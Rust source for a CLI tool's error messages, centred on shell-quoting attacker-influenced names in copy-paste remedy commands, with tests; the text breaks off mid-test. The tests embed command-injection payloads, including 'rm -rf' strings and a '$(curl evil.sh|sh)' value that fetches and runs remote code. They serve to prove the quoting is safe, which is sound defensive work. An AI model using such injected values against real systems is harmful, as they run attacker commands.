    AmbiguousHookTarget {
        target: String,
        /// The kind-qualified `<source>#<kind>:<name>` ref for each installed
        /// item the target string also names.
        item_forms: Vec<String>,
    },

    /// CLI-212/CLI-213: a linked local source's (`Source::is_linked`) working
    /// tree has vanished since it was melded - a relocated or deleted `/tmp`
    /// fixture, or a `cd` past a relative clean-up. Raised by
    /// `catalog::scan_source` before `MindToml::load`'s generic
    /// NotFound-as-absent handling or a convention-scan `InvalidRoot` obscure
    /// the real cause with a less actionable message. The whole-registry walk
    /// (`catalog::scan`) catches exactly this variant and degrades (warns on
    /// stderr, keeps going with the sources that DID scan) so one dead linked
    /// source does not take down `recall`/`probe`/`learn`; a targeted
    /// single-source scan (`meld`, a fresh clone) still hard-fails on it since
    /// in practice a just-cloned directory cannot itself be gone.
    // spec: CLI-212 CLI-213
    #[error("{}", linked_source_gone_message(source_name, path))]
    LinkedSourceGone { source_name: String, path: String },

    /// HOOK-107 (source targets) / HOOK-108 (item targets): a `hooks run
    /// <target>` invocation found at least one hook that existed and needed
    /// running, but EVERY one of them was skipped for want of consent (no
    /// terminal, and `--dangerously-skip-install-hook-check` not given) - so
    /// the run did nothing, silently, in the state where a provisioning script
    /// most needs to know it. A run with nothing to do (no hooks declared, or
    /// every install hook already ran at the current commit) is unaffected and
    /// stays exit 0; only "there was work and consent was unavailable" is this
    /// error.
    ///
    /// `event` is the lifecycle event the run selected, carried so the printed
    /// remedy re-selects it (HOOK-106): without it the suggested command
    /// re-runs the default `install` hooks, which for an `uninstall` run is
    /// different code than the one that was skipped.
    ///
    /// `resolved` is the RESOLVED identity of every source or item that
    /// actually contributed a skipped hook (as opposed to `target`, the
    /// selector as the user typed it, which may be a glob). The message
    /// substitutes a resolved identity into the remedy instead of the raw
    /// selector (HOOK-106/107): a selector like `'*'` echoed back into a
    /// "re-run with ..." command would glob-expand against the caller's cwd
    /// if pasted into a shell, naming something that may not even be a
    /// source. When `resolved` holds exactly one identity, the remedy is that
    /// one paste-able command, exactly as when the target was already a
    /// literal name. When it holds more than one, no single command is
    /// synthesized; the message instead lists every resolved identity so the
    /// reader can substitute one at a time, rather than printing something
    /// that reads as one runnable command but is not.
    // spec: HOOK-106 HOOK-107 HOOK-108
    #[error("{}", hooks_not_run_message(target, event, *skipped, resolved))]
    HooksNotRun {
        target: String,
        event: String,
        skipped: usize,
        resolved: Vec<String>,
    },
}

/// Single-quote `s` for safe interpolation into a POSIX shell command line
/// (HOOK-106): every embedded single quote is closed, escaped with a
/// backslash-quoted literal quote, and reopened -- the standard `'\''` idiom.
/// A resolved source or item identity is attacker-influenced (a source name,
/// marketplace alias, or item-link path segment; see `validate_prefix` /
/// `is_safe_manifest_path`, which allow shell metacharacters) and is placed
/// verbatim into a "copy this and run it" remedy, so every such identity must
/// pass through here before it reaches a formatted command string. Quoting
/// even a value with no metacharacters is harmless (`'plain'` behaves
/// identically to `plain` once past the shell), so this is applied
/// unconditionally rather than only when something "looks dangerous".
///
/// `pub(crate)` so the non-error skip NOTE `hooks_cmd.rs` prints during the hook
/// loop (which interpolates the same attacker-influenced identity into a
/// pasteable `mind hooks run <id> ...` command) reuses this exact quoting rather
/// than re-deriving it, keeping the note and the [`MindError::HooksNotRun`] error
/// consistent (HOOK-106).
pub(crate) fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// The [`MindError::AmbiguousHookTarget`] message (HOOK-105/HOOK-106): both
/// disambiguating forms it prints (`source:<target>` and the kind-qualified
/// item ref) are runnable `mind hooks run <arg>` commands, and `target` /
/// `item_forms` are exactly as attacker-influenced as a `HooksNotRun` resolved
/// identity (a source identity or `<source>#<kind>:<name>` item form under the
/// same permissive `validate_prefix`/`is_safe_manifest_path` validators, which
/// allow shell metacharacters including an embedded `'`). Each is passed
/// through [`shell_quote`] before it lands in a printed command, exactly as
/// `hooks_not_run_message` treats a resolved identity -- an unquoted value
/// here would be the same class of injection HOOK-106 already closed for
/// `HooksNotRun`, just reachable through this sibling message instead. The
/// plain-English mentions of `target` earlier in the sentence (describing
/// *what* is ambiguous, not a command to run) are left bare: they are prose,
/// not something a reader is invited to paste into a shell.
fn ambiguous_hook_target_message(target: &str, item_forms: &[String]) -> String {
    let source_arg = shell_quote(&format!("source:{target}"));
    let item_form = item_forms.first().map(String::as_str).unwrap_or("");
    let item_arg = shell_quote(item_form);
    format!(
        "'{target}' is ambiguous: it names both the registered source '{target}' and installed item(s) matching the same string; \
         to target the source, run `mind hooks run {source_arg}`; to target an item, use a kind-qualified ref, e.g. `mind hooks run {item_arg}`"
    )
}

/// The [`MindError::HooksNotRun`] message (HOOK-106/107/108): see the
/// variant's doc comment for the single-vs-several-`resolved` distinction.
///
/// `resolved` identities are shell-quoted (HOOK-106) before they are placed
/// into the printed "re-run with ..." command: they come from source names,
/// marketplace aliases, and item-link paths, none of which are restricted
/// against shell metacharacters, so pasting the remedy verbatim must not be
/// able to run anything beyond `mind hooks run`. The single-match arm puts the
/// runnable command on its own line, indented, with no surrounding shell-quote
/// character (no `"..."` frame): the identity inside it is itself
/// single-quoted by `shell_quote`, and framing the whole command in a
/// DOUBLE-quote presentation frame (as this arm once did) is copyable in a way
/// that re-exposes `$`/backtick metacharacters -- a double-quoted context
/// keeps `$` and a backtick special, so a verbatim paste of the frame's
/// closing/opening double quotes together with the single-quoted identity
/// inside it would let a `$(...)`/backtick payload fire again, even though the
/// identity is safely single-quoted on its own. Putting the command on its own
/// line with no quote character to paste along with it removes that surface
/// entirely, while staying readable.
fn hooks_not_run_message(target: &str, event: &str, skipped: usize, resolved: &[String]) -> String {
    debug_assert!(
        !resolved.is_empty(),
        "hooks_not_run_message: resolved must never be empty -- both construction sites \
         (run_source_hooks/run_item_hooks) only build MindError::HooksNotRun once at least \
         one contributor pushed a resolved identity"
    );
    match resolved {
        [one] => {
            let quoted = shell_quote(one);
            format!(
                "hooks run '{one}': {skipped} hook(s) had work to do but were skipped for want \
                 of consent (not a terminal); re-run unattended with:\n  mind hooks run {quoted} \
                 --event {event} --dangerously-skip-install-hook-check"
            )
        }
        _ => {
            let names = if resolved.is_empty() {
                String::new()
            } else {
                let quoted: Vec<String> = resolved.iter().map(|n| shell_quote(n)).collect();
                format!(" ({})", quoted.join(", "))
            };
            format!(
                "hooks run '{target}': {skipped} hook(s) had work to do but were skipped for \
                 want of consent (not a terminal), across {} matched target(s){names}; re-run \
                 each individually with 'mind hooks run <name> --event {event} \
                 --dangerously-skip-install-hook-check', substituting each resolved name above \
                 for <name>",
                resolved.len()
            )
        }
    }
}

/// The [`MindError::LinkedSourceGone`] message (CLI-212/CLI-213). The
/// `mind unmeld <source>` remedy is a copy-paste command, and `source_name` is
/// an attacker-influenced source identity (a source name, a `meld --as`/
/// `[source].prefix` alias, or an item-link `#<path>` segment; see
/// `validate_prefix`/`is_safe_manifest_path`, which permit shell
/// metacharacters), so the identity inside the runnable command is passed
/// through [`shell_quote`] before it lands there -- the same rule the `hooks
/// run` remedy family applies (HOOK-106, generalized by CLI-225). The earlier
/// bare mentions of `source_name`/`path` are English prose naming what is gone,
/// not a command, so they are left unquoted. This closes the same
/// single-quote-framed-raw-value injection the `hooks run` family closed:
/// before this, a `'`-carrying source name in a stale/tampered registry entry
/// broke out of the old `'mind unmeld {source_name}'` frame, and pasting the
/// suggested `mind unmeld ...` ran the injected code.
fn linked_source_gone_message(source_name: &str, path: &str) -> String {
    let quoted = shell_quote(source_name);
    format!(
        "source '{source_name}': linked working tree '{path}' is gone; run `mind unmeld {quoted}` to drop it, or restore the directory"
    )
}

/// The [`MindError::AgentCollision`] message (NS-41). The
/// `mind forget agent:<name>` remedy is a copy-paste command, and `name` is the
/// agent's bare harness name -- its frontmatter `name:` field, source-controlled
/// and not restricted against shell metacharacters (the effective-name safety
/// check in `install.rs` guards only path traversal, not `;`/`'`/`$`/backtick).
/// The whole `agent:<name>` argument is passed through [`shell_quote`] so a
/// name carrying a quote or `$(...)` cannot turn the pasteable remedy into an
/// injection (CLI-225, the same rule as HOOK-106). The earlier `agent '{name}'`
/// and `agents/{name}.md` mentions are prose / a path illustration, not a
/// command, so they are left unquoted.
fn agent_collision_message(name: &str, existing: &str, incoming: &str) -> String {
    let forget_arg = shell_quote(&format!("agent:{name}"));
    format!(
        "agent '{name}' from source '{incoming}' conflicts with the installed agent from \
         '{existing}': both link as agents/{name}.md in the agent home -- \
         run `mind forget {forget_arg}` (or the prefixed name) to remove the existing agent first"
    )
}

/// The [`MindError::SkillCollision`] message (NS-43/NS-45). The
/// `mind meld --namespace <prefix> <repo>` remedy is a copy-paste command
/// (once `<repo>` is filled in), and `suggested` is the prefix derived from the
/// incoming source's repo name / last URL component -- for a local-path meld
/// that is a directory basename, which can carry a `;`/`'`/space and is not
/// restricted against shell metacharacters. It is passed through [`shell_quote`]
/// before it lands in the runnable command (CLI-225, the same rule as
/// HOOK-106). The conflict list built by `format_conflicts` is a bulleted
/// listing, not a command a reader pastes, so its names are not quoted here.
/// The [`MindError::UpgradeRenameCollision`] message (LIFE-46, CLI-225). The
/// `mind forget <key>` remedy is a copy-paste command, and `key` is the
/// colliding manifest key (`kind:name`, the effective name) -- derived from a
/// source-controlled item name. `catalog::is_safe_item_name` rejects only `/`,
/// `\`, a NUL byte, and blocked Unicode; it does NOT restrict shell
/// metacharacters (`;`, whitespace, `$(...)`, a backtick), so `key` is exactly
/// as attacker-influenced as the identities the sibling CLI-225 remedies
/// (`LinkedSourceGone`, `AgentCollision`, `SkillCollision`) already quote. The
/// old message spliced `key` straight into the backticked `mind forget {key}`
/// command: a skill named e.g. `x; touch /tmp/pwned` (or one melded via a
/// curated super-source that pulls in two hostile repos shipping it under a
/// prefix, both dropping their prefix upstream so `mind upgrade` hits the
/// batch-convergence branch that raises this variant) produced a remedy that
/// ran the attacker's command when pasted. `key` is passed through
/// [`shell_quote`] before it lands in the runnable command; the earlier bare
/// `'{key}'` mention at the start of the sentence is prose naming what
/// collided, not a command, so it is left unquoted.
fn upgrade_rename_collision_message(
    key: &str,
    existing_source: &str,
    incoming: &str,
    incoming_source: &str,
) -> String {
    let forget_arg = shell_quote(key);
    format!(
        "upgrade cannot rename to '{key}': it is already claimed by the item from source \
         '{existing_source}', and {incoming} from source '{incoming_source}' would also resolve \
         to this key; run `mind forget {forget_arg}` to remove the item occupying it, or \
         re-namespace the incoming source with `mind meld -N <prefix> <repo>` to avoid the \
         collision"
    )
}

fn skill_collision_message(conflicts: &[(String, String, String)], suggested: &str) -> String {
    let ns = shell_quote(suggested);
    format!(
        "name collision: the following items from the incoming source conflict with \
         already-installed items:\n{}\nrun `mind meld --namespace {ns} <repo>` \
         to namespace the incoming source",
        format_conflicts(conflicts)
    )
}

/// The [`MindError::UnsafePrefix`] message (NS-28/NS-72). `prefix` is
/// source-controlled (a melded repo's `[source].prefix`), so it is routed
/// through [`crate::sanitize::strip_ansi`] before display, the same pattern
/// [`unsafe_name_message`] uses: otherwise the rejection meant to stop a
/// bidi-spoofing or terminal-injecting prefix would itself write that raw
/// payload to stderr. The cause list is worded generically ("an invisible,
/// bidi, or zero-width character") rather than enumerating specific code
/// points, since the exact blocked set lives in `sanitize.rs` and can grow.
fn unsafe_prefix_message(prefix: &str) -> String {
    format!(
        "'{}' cannot be used as a namespace prefix: it must be a single safe path component \
         (no `/`, `\\`, `:`, `.`, `..`, leading `~`, NUL, control character, or an invisible, \
         bidi, or zero-width character)",
        crate::sanitize::strip_ansi(prefix)
    )
}

/// The [`MindError::UnsafeName`] message (NS-28). The raise site
/// (`install.rs`) fires on path-traversal characters, an embedded NUL, and an
/// empty name alike, so the cause list must cover all three rather than only
/// naming path traversal -- otherwise an ordinary-looking name that failed for
/// carrying a NUL (`foo\0bar`, itself stripped for display below) is paired
/// with a cause ("contains path-traversal characters") that plainly does not
/// apply to it. `name` is routed through [`crate::sanitize::strip_ansi`]
/// before display (DSC-95); when that stripping actually changed the value,
/// the message says so explicitly, so the reader is not left comparing the
/// displayed name against what they typed and finding a mismatch with no
/// explanation.
fn unsafe_name_message(name: &str) -> String {
    let stripped = crate::sanitize::strip_ansi(name);
    let display_note = if stripped != name {
        " (shown above with non-printing characters stripped for display)"
    } else {
        ""
    };
    format!(
        "unsafe effective name '{stripped}'{display_note}: contains path-traversal characters, \
         resolves to a relative component (`.`/`..`), contains a NUL byte, or is empty; \
         refusing to build store or link paths from it"
    )
}

/// The [`MindError::ItemNotFound`] message (CLI-179). When `query` itself
/// carries a character DSC-95 would sanitize away for display (a control byte,
/// ANSI escape, or invisible/bidi code point), a plain "no item matches"
/// leaves the reader stuck comparing a name they can see (from `recall`,
/// already sanitized for display) against a ref they typed that will never
/// literally match it; a trailing hint names the likely cause instead of
/// leaving the mismatch unexplained.
fn item_not_found_message(query: &str, sources: usize) -> String {
    let base = if sources == 0 {
        format!(
            "no item matches '{query}'; no sources are melded yet -- run `mind meld <repo>` to add one"
        )
    } else {
        format!(
            "no item matches '{query}' across {sources} melded source(s); run `mind probe` to search available items"
        )
    };
    if crate::sanitize::has_blocked_chars(query) {
        format!(
            "{base} (note: this ref may contain a non-printing character that makes it \
             untypeable as shown; compare it byte-for-byte with `mind probe`)"
        )
    } else {
        base
    }
}

/// The [`MindError::NotInstalled`] message. DSC-95 sanitizes the *display* of
/// an installed name (e.g. in `recall`) while keeping the raw name as
/// identity, so `forget <the displayed name>` can fail here even though
/// `recall` just showed what looks like the same name -- because the raw name
/// carries a non-printing character `recall`'s display stripped. A trailing
/// hint names that possibility rather than leaving an unfalsifiable-looking
/// contradiction.
fn not_installed_message(name: &str) -> String {
    if crate::sanitize::has_blocked_chars(name) {
        format!(
            "'{name}' is not installed (note: this ref may contain a non-printing character \
             that makes it untypeable as shown; compare it byte-for-byte with `mind recall`)"
        )
    } else {
        format!("'{name}' is not installed")
    }
}

/// The [`MindError::InvalidRoot`] message (DSC-95). Both `source_name` and
/// `root` are source-controlled and reach `main.rs`'s `eprintln!("error:
/// {err}")` verbatim, so each is routed through [`crate::sanitize::strip_ansi`]
/// before display -- the same pattern [`unsafe_name_message`] uses.
fn invalid_root_message(source_name: &str, root: &str) -> String {
    format!(
        "source '{}': scan root '{}' is not a directory in the clone",
        crate::sanitize::strip_ansi(source_name),
        crate::sanitize::strip_ansi(root)
    )
}

/// The [`MindError::DuplicateItem`] message (DSC-95). Both `source_name` and
/// `name` are source-controlled and reach `main.rs`'s `eprintln!("error:
/// {err}")` verbatim, so each is routed through [`crate::sanitize::strip_ansi`]
/// before display -- the same pattern [`unsafe_name_message`] uses.
fn duplicate_item_message(source_name: &str, kind: ItemKind, name: &str) -> String {
    format!(
        "source '{}': {kind} '{}' appears under more than one scan root; roots must not yield \
         the same item",
        crate::sanitize::strip_ansi(source_name),
        crate::sanitize::strip_ansi(name)
    )
}

/// The [`MindError::LearnPatternNoMatch`] message (CLI-236, CLI-225, DSC-95).
/// See the variant's doc comment for why `source_name` is both sanitized and,
/// for the occurrence inside the backticked `mind probe` command, shell-quoted:
/// it is source-controlled (an item-link identity embeds a repo-controlled
/// path) and this message is its own suggested remedy, so an unquoted
/// occurrence would let a hostile repo turn the remedy into an injection when
/// pasted, exactly the class of bug `hooks_not_run_message` closed for HOOK-106
/// and generalized here as CLI-225. `pattern` never appears inside a command
/// here, but is sanitized too, defensively.
fn learn_no_match_message(pattern: &str, source_name: &str) -> String {
    let pattern = crate::sanitize::strip_ansi(pattern);
    let source_name = crate::sanitize::strip_ansi(source_name);
    let quoted = shell_quote(&source_name);
    format!(
        "--learn pattern '{pattern}' matches no item in source '{source_name}'; run `mind probe --source {quoted} --no-tui` to list what it offers. An item the source's inventory does not declare needs `--add-root <dir>` at the meld that registers the source (`unmeld` first if it is already melded), and a curated super-source's nested sources register as their own sources"
    )
}

fn status_suffix(status: Option<ExitStatus>) -> String {
    match status.and_then(|s| s.code()) {
        Some(code) => format!(" (exit {code})"),
        None => String::new(),
    }
}

impl MindError {
    /// Build an [`MindError::Io`] tagged with the path it happened at.
    pub fn io(path: impl Into<PathBuf>, source: std::io::Error) -> Self {
        MindError::Io {
            path: path.into(),
            source,
        }
    }

    /// Build an [`MindError::Json`] tagged with what was being processed.
    pub fn json(what: impl Into<String>, source: serde_json::Error) -> Self {
        MindError::Json {
            what: what.into(),
            source,
        }
    }

    /// A stable kebab-case slug that identifies this error variant. Used as the
    /// `kind` field in the JSON error envelope emitted under `--json` (CLI-181).
    /// These slugs are API: they must not change once assigned.
    // spec: CLI-182
    pub fn kind(&self) -> &'static str {
        match self {
            MindError::HomeDirNotFound => "home-dir-not-found",
            MindError::Io { .. } => "io",
            MindError::Json { .. } => "json",
            MindError::Toml { .. } => "toml",
            MindError::ConfigToml { .. } => "config-toml",
            MindError::TomlWrite { .. } => "toml-write",
            MindError::UnknownLobe { .. } => "unknown-lobe",
            MindError::UnknownKind { .. } => "unknown-kind",
            MindError::UnknownPreset { .. } => "unknown-preset",
            MindError::LobeTargetRequired => "lobe-target-required",
            MindError::BrokenSymlinkPath { .. } => "broken-symlink-path",
            MindError::MindToml { .. } => "mind-toml",
            MindError::Manifest { .. } => "manifest",
            MindError::MetadataTooLarge { .. } => "metadata-too-large",
            MindError::InvalidRepoSpec { .. } => "invalid-repo-spec",
            MindError::UnsafeRepoSpec { .. } => "unsafe-repo-spec",
            MindError::BadItemLink { .. } => "bad-item-link",
            MindError::InvalidItemRef { .. } => "invalid-item-ref",
            MindError::ReservedPrefix { .. } => "reserved-prefix",
            MindError::UnsafePrefix { .. } => "unsafe-prefix",
            MindError::NamespaceLocked { .. } => "namespace-locked",
            MindError::SourceExists { .. } => "source-exists",
            MindError::SourceNotFound { .. } => "source-not-found",
            MindError::InvalidPattern { .. } => "invalid-pattern",
            MindError::AmbiguousSource { .. } => "ambiguous-source",
            MindError::ItemNotFound { .. } => "item-not-found",
            MindError::AmbiguousItem { .. } => "ambiguous-item",
            MindError::UpgradeRenameCollision { .. } => "upgrade-rename-collision",
            MindError::NotInstalled { .. } => "not-installed",
            MindError::SyncFailed { .. } => "sync-failed",
            MindError::IncompatibleVersion { .. } => "incompatible-version",
            MindError::LinkOccupied { .. } => "link-occupied",
            MindError::BadReference { .. } => "bad-reference",
            MindError::Git { .. } => "git",
            MindError::CuratorAllNestedFailed { .. } => "curator-all-nested-failed",
            MindError::GitNotFound => "git-not-found",
            MindError::ConflictingPin { .. } => "conflicting-pin",
            MindError::BadPinSpec { .. } => "bad-pin-spec",
            MindError::InvalidRoot { .. } => "invalid-root",
            MindError::LinkNotASkill { .. } => "link-not-a-skill",
            MindError::LinkRefUnsatisfiable { .. } => "link-ref-unsatisfiable",
            MindError::BadIgnorePattern { .. } => "bad-ignore-pattern",
            MindError::IgnoresOwnAnchor { .. } => "ignores-own-anchor",
            MindError::ExpandsIgnoredFile { .. } => "expands-ignored-file",
            MindError::InvalidLearnPattern { .. } => "invalid-learn-pattern",
            MindError::LearnPatternNoMatch { .. } => "learn-pattern-no-match",
            MindError::DuplicateItem { .. } => "duplicate-item",
            MindError::ReviewFailed { .. } => "review-failed",
            MindError::SourceNotAllowed { .. } => "source-not-allowed",
            MindError::LocalMeldForbidden { .. } => "local-meld-forbidden",
            MindError::UnpinnedSourceForbidden { .. } => "unpinned-source-forbidden",
            MindError::InvalidPolicy { .. } => "invalid-policy",
            MindError::LobesLocked { .. } => "lobes-locked",
            MindError::HookFailed { .. } => "hook-failed",
            MindError::UnsupportedPlatform { .. } => "unsupported-platform",
            MindError::DownloadFailed { .. } => "download-failed",
            MindError::ReleaseAssetEmpty => "release-asset-empty",
            MindError::TargetNotWritable { .. } => "target-not-writable",
            MindError::NotADirectory { .. } => "not-a-directory",
            MindError::ConfirmationRequired { .. } => "confirmation-required",
            MindError::DestinationNotRepo { .. } => "destination-not-repo",
            MindError::InvalidRef { .. } => "invalid-ref",
            MindError::AbsorbCollision { .. } => "absorb-collision",
            MindError::AgentCollision { .. } => "agent-collision",
            MindError::SkillCollision { .. } => "skill-collision",
            MindError::UnsafeName { .. } => "unsafe-name",
            MindError::DigestMismatch { .. } => "digest-mismatch",
            MindError::AttestationVerificationFailed { .. } => "attestation-verification-failed",
            MindError::SelfUpdatePolicy { .. } => "self-update-policy",
            MindError::SelfUpdateInvalidTarget { .. } => "self-update-invalid-target",
            MindError::StateTooNew { .. } => "state-too-new",
            MindError::BuildEventRequiresItemTarget => "build-event-requires-item-target",
            MindError::HookAborted { .. } => "hook-aborted",
            MindError::LobeBaseMissing { .. } => "lobe-base-missing",
            MindError::UnsafeClonePath { .. } => "unsafe-clone-path",
            MindError::AmbiguousHookTarget { .. } => "ambiguous-hook-target",
            MindError::LinkedSourceGone { .. } => "linked-source-gone",
            MindError::HooksNotRun { .. } => "hooks-not-run",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;

    /// `shell_quote` round-trips a malicious identity through a real `sh -c`
    /// invocation byte-for-byte (HOOK-106): the same technique `hook.rs::run_hook`
    /// uses to run declared hooks, applied here in the other direction to prove
    /// the quoting is what actually protects the pasteable remedy. A source
    /// name, marketplace alias, or item-link path segment is not restricted
    /// against shell metacharacters (`validate_prefix`/`is_safe_manifest_path`
    /// allow them), so an identity carrying `;`, `$(...)`, a backtick, and an
    /// embedded single quote must survive quoting unexecuted and unexpanded.
    /// Interpolating the same identity BARE (no quoting) would instead run the
    /// injected `touch`/`echo`/backtick commands, which is exactly the defect
    /// this test would catch on the unfixed code.
    #[test]
    fn shell_quote_round_trips_a_malicious_identity_through_a_real_shell() {
        // spec: HOOK-106
        if Command::new("sh").arg("-c").arg("true").status().is_err() {
            // No `sh` on PATH in this environment (mirrors selfupdate.rs's
            // `have("sh")` skip): nothing to prove here, so skip rather than
            // fail on an environment gap unrelated to the fix.
            return;
        }
        let evil = "x; touch /tmp/mind-hook-106-pwned; echo $(id) `whoami` it's-evil";
        let quoted = shell_quote(evil);

        // The quoted form must never contain the same run of characters that
        // would let a shell parse it as anything other than one literal
        // argument: no closing quote leaves an unquoted `;`/`$(`/backtick
        // stretch reachable.
        let output = Command::new("sh")
            .arg("-c")
            .arg(format!("printf '%s' {quoted}"))
            .output()
            .expect("sh -c must run");
        assert!(
            output.status.success(),
            "the quoted identity must parse as a single shell argument: {quoted:?}\nstderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert_eq!(
            String::from_utf8_lossy(&output.stdout),
            evil,
            "the shell must see the identity back EXACTLY as given, proving none of \
             ';', '$(...)', backtick, or the embedded quote were interpreted rather \
             than passed through literally: quoted form was {quoted:?}"
        );

        // Belt-and-braces: the injected commands must not have actually run.
        let sentinel = std::path::Path::new("/tmp/mind-hook-106-pwned");
        assert!(
            !sentinel.exists(),
            "the embedded 'touch' must not have executed"
        );
        let _ = std::fs::remove_file(sentinel);
    }

    /// P2 boundary coverage: every awkward identity a source name could carry
    /// must survive `shell_quote` as one literal argument through a real shell --
    /// a lone single quote, a trailing backslash, an embedded newline, and the
    /// characters a DOUBLE-quoted frame would NOT neutralize on its own (`"`,
    /// `$`, and a backtick command substitution). `shell_quote` single-quotes,
    /// so all of these are inert; this proves it directly rather than by
    /// inspection. If any escaped through, the injected `touch` would drop the
    /// per-case sentinel.
    #[test]
    fn shell_quote_neutralizes_every_boundary_identity_through_a_real_shell() {
        // spec: HOOK-106
        if Command::new("sh").arg("-c").arg("true").status().is_err() {
            return;
        }
        // Each payload embeds a `touch <sentinel>` attempt via a different
        // metacharacter class; none may fire once quoted.
        let cases = [
            ("lone-quote", "'", "'"),
            ("trailing-backslash", r"github.com/a/b\", r"github.com/a/b\"),
            (
                "newline",
                "a\ntouch /tmp/mind-hq-nl\nb",
                "a\ntouch /tmp/mind-hq-nl\nb",
            ),
            (
                "double-quote",
                "a\"; touch /tmp/mind-hq-dq; \"b",
                "a\"; touch /tmp/mind-hq-dq; \"b",
            ),
            (
                "dollar-paren",
                "$(touch /tmp/mind-hq-dp)",
                "$(touch /tmp/mind-hq-dp)",
            ),
            (
                "backtick",
                "`touch /tmp/mind-hq-bt`",
                "`touch /tmp/mind-hq-bt`",
            ),
        ];
        for (name, payload, expected) in cases {
            let quoted = shell_quote(payload);
            // Run through a real shell as the sole argument to `printf %s`.
            let out = Command::new("sh")
                .arg("-c")
                .arg(format!("printf '%s' {quoted}"))
                .output()
                .unwrap_or_else(|e| panic!("[{name}] sh failed: {e}"));
            assert!(
                out.status.success(),
                "[{name}] quoted form must parse as one argument: {quoted:?} stderr {}",
                String::from_utf8_lossy(&out.stderr)
            );
            assert_eq!(
                String::from_utf8_lossy(&out.stdout),
                expected,
                "[{name}] the shell must return the identity literally: quoted {quoted:?}"
            );
        }
        // None of the substitution/newline payloads may have executed `touch`.
        for p in [
            "/tmp/mind-hq-nl",
            "/tmp/mind-hq-dq",
            "/tmp/mind-hq-dp",
            "/tmp/mind-hq-bt",
        ] {
            let path = std::path::Path::new(p);
            let existed = path.exists();
            let _ = std::fs::remove_file(path);
            assert!(!existed, "an injected touch executed and dropped {p}");
        }
    }

    /// A plain identity (no shell metacharacters) round-trips unchanged in
    /// substance -- `shell_quote` is applied unconditionally, so this pins that
    /// doing so is harmless for the common case.
    #[test]
    fn shell_quote_is_harmless_for_a_plain_identity() {
        // spec: HOOK-106
        assert_eq!(
            shell_quote("github.com/jaemk/agents"),
            "'github.com/jaemk/agents'"
        );
    }

    /// `shell_quote` closes, escapes, and reopens an embedded single quote with
    /// the POSIX `'\''` idiom.
    #[test]
    fn shell_quote_escapes_embedded_single_quotes() {
        // spec: HOOK-106
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    /// The `HooksNotRun` single-identity remedy (HOOK-106) quotes the resolved
    /// identity rather than interpolating it bare: a source/item identity
    /// carrying shell metacharacters must not appear unquoted in the printed
    /// "re-run with ..." command. Fails against the unfixed
    /// `format!("... {one} ...")` interpolation, which would place the raw
    /// `;`/`$(...)`/backtick text straight into the message.
    #[test]
    fn hooks_not_run_message_shell_quotes_the_single_resolved_identity() {
        // spec: HOOK-106
        let evil = "evil; rm -rf /tmp/x".to_string();
        let msg =
            hooks_not_run_message("target-as-typed", "install", 1, std::slice::from_ref(&evil));
        assert!(
            msg.contains(&shell_quote(&evil)),
            "the remedy must carry the shell-quoted identity: {msg}"
        );
        assert!(
            !msg.contains("run evil; rm -rf /tmp/x --event"),
            "the remedy must never place the identity bare (unquoted) into the \
             runnable command: {msg}"
        );
    }

    /// The multi-identity remedy (HOOK-106/107) quotes every resolved identity
    /// in its parenthetical list, not just the first. `c` carries an embedded
    /// single quote (unlike `a`/`b`, which have no metacharacter `shell_quote`
    /// would actually need to escape) so that `shell_quote(c)` and a naive bare
    /// `'{c}'` interpolation produce DIFFERENT text: without this case, `a` and
    /// `b` alone would pass against the unfixed bare `'{n}'` interpolation too,
    /// since quoting a value with no embedded quote is a no-op either way.
    #[test]
    fn hooks_not_run_message_shell_quotes_every_resolved_identity_in_the_list() {
        // spec: HOOK-106 HOOK-107
        let a = "one; touch /tmp/a".to_string();
        let b = "two`whoami`".to_string();
        let c = "x'; rm -rf ~; echo '".to_string();
        let msg = hooks_not_run_message("glob*", "install", 3, &[a.clone(), b.clone(), c.clone()]);
        assert!(msg.contains(&shell_quote(&a)), "{msg}");
        assert!(msg.contains(&shell_quote(&b)), "{msg}");
        assert!(msg.contains(&shell_quote(&c)), "{msg}");
        assert!(!msg.contains("(one; touch /tmp/a"), "{msg}");
        // `shell_quote(c)` closes/escapes/reopens the embedded quote with the
        // `'\''` idiom; a bare `'{c}'` interpolation would instead close the
        // frame early at `c`'s first `'`, leaving `; rm -rf ~; echo ''`
        // reachable as unquoted shell text.
        assert!(
            !msg.contains("'x'; rm -rf ~; echo ''"),
            "must never carry the broken bare `'{{n}}'` interpolation of the \
             single-quote-carrying identity: {msg}"
        );
    }

    /// HOOK-106/107/108: an incoherent "0 matched target(s)" remedy never
    /// renders -- `hooks_not_run_message` is only ever reached with a non-empty
    /// `resolved` (both `run_source_hooks` and `run_item_hooks` build
    /// `MindError::HooksNotRun` only after at least one contributor pushed a
    /// resolved identity), and this pins the invariant with a `debug_assert`
    /// so a future construction site that violates it fails loudly in
    /// debug/test builds rather than emitting self-contradictory text.
    #[test]
    #[should_panic(expected = "resolved must never be empty")]
    fn hooks_not_run_message_asserts_resolved_is_never_empty() {
        // spec: HOOK-106
        let _ = hooks_not_run_message("target", "install", 0, &[]);
    }

    /// CLI-225: `LearnPatternNoMatch`'s remedy is its own suggested `mind probe`
    /// command, and the source identity it carries is source-controlled: an
    /// item-link identity is `host/owner/repo#<item_path>`, and `item_path` is
    /// validated only against traversal, not shell metacharacters, so a
    /// hostile repo can make this exact identity the source name (e.g. by
    /// shipping `skills/x$(curl evil.sh|sh)/SKILL.md`). Before the fix, the
    /// identity was interpolated bare into the backticked command, so pasting
    /// mind's own advice ran the attacker's payload. This asserts the
    /// occurrence inside the backticked command is quoted and the payload
    /// cannot break out of it.
    #[test]
    fn learn_no_match_message_shell_quotes_the_source_identity_in_the_command() {
        // spec: CLI-225 CLI-236
        let evil = "github.com/o/r#skills/x$(curl evil.sh|sh)";
        let msg = learn_no_match_message("review", evil);

        assert!(
            msg.contains(&format!(
                "mind probe --source {} --no-tui",
                shell_quote(evil)
            )),
            "the printed remedy must carry the shell-quoted identity: {msg}"
        );
        assert!(
            !msg.contains("--source github.com/o/r#skills/x$(curl evil.sh|sh) --no-tui"),
            "the identity must never appear bare (unquoted) inside the runnable command: {msg}"
        );

        // Belt-and-braces: run the exact quoted form the message carries
        // through a real shell and confirm the embedded `$(...)` never
        // executes -- it must round-trip byte-for-byte instead.
        if Command::new("sh").arg("-c").arg("true").status().is_err() {
            return;
        }
        let quoted = shell_quote(evil);
        let output = Command::new("sh")
            .arg("-c")
